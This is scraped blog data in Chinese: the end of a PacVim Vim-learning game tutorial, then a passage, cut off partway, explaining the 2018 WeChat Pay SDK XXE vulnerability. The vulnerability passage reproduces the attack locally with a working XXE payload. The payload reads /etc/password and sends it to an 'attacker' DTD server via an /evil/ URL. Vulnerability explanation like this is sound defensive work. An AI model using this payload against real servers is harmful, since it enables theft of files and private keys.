class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim 5 n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752cc6077145567715-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752cc6077145567715-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752cc6077145567715-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">n</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752cc6077145567715-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这里，<code>5</code> 表示等级，<code>n</code>表示模式。有两种模式：</p>\n<ul>\n<li><code>n</code> – 普通模式。</li>\n<li><code>h</code> – 困难模式。</li>\n</ul>\n<p>默认模式是 <code>h</code>，这很难：</p>\n<p>要从头开始（<code>0</code> 级），请运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752cc607b902725485\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752cc607b902725485-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752cc607b902725485-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752cc607b902725485-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752cc607b902725485-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>以下是我 Ubuntu 18.04 LTS 的示例输出。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/89a95a6695047749834d9662e67957f2.png\" alt=\"\"></p>\n<p>要开始游戏，只需按下回车。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/aeb1e44f7421aad3ecab3a2937083929.png\" alt=\"\"></p>\n<p>现在开始游戏。阅读下一节了解如何玩。</p>\n<p>要退出，请按下 <code>ESC</code> 或 <code>q</code>。</p>\n<p>以下命令以困难模式启动游戏第 <code>5</code> 关。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752cc607e358336180\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim 5 h\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752cc607e358336180-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752cc607e358336180-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752cc607e358336180-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">h</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752cc607e358336180-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752cc6081338484497\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim 5\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752cc6081338484497-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752cc6081338484497-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752cc6081338484497-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752cc6081338484497-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h4 id=\"toc_4\">如何玩 PacVim？</h4>\n<p>PacVim 的使用与 PacMan 非常相似。</p>\n<p>你必须跑过屏幕上所有的字符，同时避免鬼魂（红色字符）。</p>\n<p>PacVim有两个特殊的障碍：</p>\n<ol>\n<li>你不能移动到墙壁中（黄色）。你必须使用 vim 动作来跳过它们。</li>\n<li>如果你踩到波浪字符（青色的 <code>~</code>），你就输了！</li>\n</ol>\n<p>你有三条生命。每次打赢 0、3、6、9 关时你都会获得新生命。总共有 10 关，从 0 到 9，打赢第 9 关后，游戏重置为第 0 关，但是鬼魂速度变快。</p>\n<p><strong>获胜条件</strong></p>\n<p>使用 vim 命令将光标移动到字母上并高亮显示它们。所有字母都高亮显示后，你就会获胜并进入下一关。</p>\n<p><strong>失败条件</strong></p>\n<p>如果你碰到鬼魂（用<strong>红色 G</strong> 表示）或者<strong>波浪字符</strong>，你就会失去一条命。如果命小于 0 条，你将会输掉整个游戏。</p>\n<p>这是实现的命令列表：</p>\n<table cellpadding=\"4\">\n<thead>\n<tr>\n<th>键</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>q</td>\n<td>退出游戏</td>\n</tr>\n<tr>\n<td>h</td>\n<td>向左移动</td>\n</tr>\n<tr>\n<td>j</td>\n<td>向下移动</td>\n</tr>\n<tr>\n<td>k</td>\n<td>向上移动</td>\n</tr>\n<tr>\n<td>l</td>\n<td>向右移动</td>\n</tr>\n<tr>\n<td>w</td>\n<td>向前移动到下一个 word 开始</td>\n</tr>\n<tr>\n<td>W</td>\n<td>向前移动到下一个 WORD 开始</td>\n</tr>\n<tr>\n<td>e</td>\n<td>向前移动到下一个 word 结束</td>\n</tr>\n<tr>\n<td>E</td>\n<td>向前移动到下一个 WORD 结束</td>\n</tr>\n<tr>\n<td>b</td>\n<td>向后移动到下一个 word 开始</td>\n</tr>\n<tr>\n<td>B</td>\n<td>向后移动到下一个 WORD 开始</td>\n</tr>\n<tr>\n<td>$</td>\n<td>移动到行的末尾</td>\n</tr>\n<tr>\n<td>0</td>\n<td>移动到行的开始</td>\n</tr>\n<tr>\n<td>gg/1G</td>\n<td>移动到第一行的开始</td>\n</tr>\n<tr>\n<td>数字加 G</td>\n<td>移动到由数字给出的行的开始</td>\n</tr>\n<tr>\n<td>G</td>\n<td>移到最后一行的开头</td>\n</tr>\n<tr>\n<td>^</td>\n<td>移到当前行的第一个 word</td>\n</tr>\n<tr>\n<td>＆</td>\n<td>1337 cheatz（打赢当前关）</td>\n</tr>\n</tbody>\n</table>\n<p>玩过几关之后，你可能会注意到 vim 的使用有改善。一段时间后继续玩这个游戏，直到你掌握 Vim 的使用。</p>\n<p><strong>建议阅读：</strong></p>\n<p>今天就是这些。希望这篇文章有用。PacVim 好玩又有趣并且让你有事做。同时，你应该能够彻底学习足够的 Vim 命令。试试看，你不会感到失望。</p>\n<p>还有更多的好东西。敬请关注！</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114134\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114134votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114134\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux,Vim", "url": "http://blog.jobbole.com/114134/", "url_obj_id": "f852671c846c5a0304c03ce2522024c6"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/09/3fb6592ac92133a71f0ae78e43683e83.jpg"], "title": "谈谈微信支付曝出的漏洞", "create_date": "2018/07/06 ·", "praise_num": 1, "fav_num": 1, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/kismetv/p/9266224.html\">编程迷思</a>   </div><h1>一、背景</h1>\n<p>昨天（2018-07-04）微信支付的SDK曝出重大漏洞（XXE漏洞），通过该漏洞，攻击者可以获取服务器中目录结构、文件内容，如代码、各种私钥等。获取这些信息以后，攻击者便可以为所欲为，其中就包括众多媒体所宣传的“0元也能买买买”。</p>\n<p>漏洞报告地址；http://seclists.org/fulldisclosure/2018/Jul/3</p>\n<h1>二、漏洞原理</h1>\n<h2>1.  XXE漏洞</h2>\n<p>此次曝出的漏洞属于XXE漏洞，即XML外部实体注入（XML External Entity Injection）。</p>\n<p>XML文档除了可以包含声明和元素以外，还可以包含文档类型定义（即DTD）；如下图所示。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/fd852c808e1da4c7f569a8ac7e846bb6.png\" alt=\"\"></p>\n<p>在DTD中，可以引进实体，在解析XML时，实体将会被替换成相应的引用内容。该实体可以由外部引入(支持http、ftp等协议，后文以http为例说明)，如果通过该外部实体进行攻击，就是XXE攻击。</p>\n<p>可以说，<strong>XXE漏洞之所以能够存在，本质上在于在解析XML的时候，可以与外部进行通信；当XML文档可以由攻击者任意构造时，攻击便成为可能。</strong>在利用XXE漏洞可以做的事情当中，最常见最容易实现的，便是读取服务器的信息，包括目录结构、文件内容等；本次微信支付爆出的漏洞便属于这一种。</p>\n<h2>2.  微信支付漏洞</h2>\n<p>本次漏洞影响的范围是：在微信支付异步回调接口中，使用微信支付SDK进行XML解析的应用。注意这里的SDK是服务器端的SDK，APP端使用SDK并不受影响。</p>\n<p>SDK下载地址如下（目前微信官方宣传漏洞已修复）：https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip</p>\n<p>SDK中导致漏洞的代码是WXPayUtil工具类中的xmlToMap()方法：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6d8373c58efb34c2810ec33cacbf601c.png\" alt=\"\"></p>\n<p>如上图所示，由于在解析XML时没有对外部实体的访问做任何限制，如果攻击者恶意构造xml请求，便可以对服务器进行攻击。下面通过实例介绍攻击的方法。</p>\n<h2>3.  攻击复现</h2>\n<p>下面在本机环境下进行复现。</p>\n<p>假设本地的web服务器127.0.0.1:8080中存在POST接口：/wxpay/callback，该接口中接收xml字符串做参数，并调用前述的WXPayUtil.xmlToMap(strXml)对xml参数进行解析。此外，/etc/password中存储了重要的密码数据（如password1234）。</p>\n<p>攻击时构造的请求如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9606ad59ae08f52ccf9b7d1fe44b6c09.png\" alt=\"\"></p>\n<p>其中xml内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ac9b913efd420137319\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\r\n&lt;!DOCTYPE root [\r\n    &lt;!ENTITY % file SYSTEM \"file:///etc/password\"&gt;\r\n    &lt;!ENTITY % xxe SYSTEM \"http://127.0.0.1:9000/xxe.dtd\"&gt;\r\n    %xxe;\r\n]&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913efd420137319-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ac9b913efd420137319-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913efd420137319-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ac9b913efd420137319-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913efd420137319-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ac9b913efd420137319-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ac9b913efd420137319-1\"><span class=\"crayon-ta\">&lt;?</span><span class=\"crayon-e\">xml </span><span class=\"crayon-i\">version</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"1.0\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">encoding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"utf-8\"</span><span class=\"crayon-ta\">?&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ac9b913efd420137319-2\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">DOCTYPE </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line\" id=\"crayon-5b4ac9b913efd420137319-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file </span><span class=\"crayon-i\">SYSTEM</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"file:///etc/password\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ac9b913efd420137319-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">xxe </span><span class=\"crayon-i\">SYSTEM</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"http://127.0.0.1:9000/xxe.dtd\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ac9b913efd420137319-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">xxe</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ac9b913efd420137319-6\"><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n<p>其中/etc/password为要窃取的对象，http://127.0.0.1:9000/xxe.dtd为攻击者服务器中的dtd文件，内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ac9b913f07395292810\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;!ENTITY % shell \"&lt;!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'&gt;\"&gt;\r\n%shell;\r\n%upload;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913f07395292810-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ac9b913f07395292810-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913f07395292810-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ac9b913f07395292810-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ac9b913f07395292810-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">shell</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"&lt;!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'&gt;\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ac9b913f07395292810-2\"><span class=\"crayon-ta\">%</span><span class=\"crayon-v\">shell</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ac9b913f07395292810-3\"> </div><div class=\"crayon-line crayon-striped-line\" 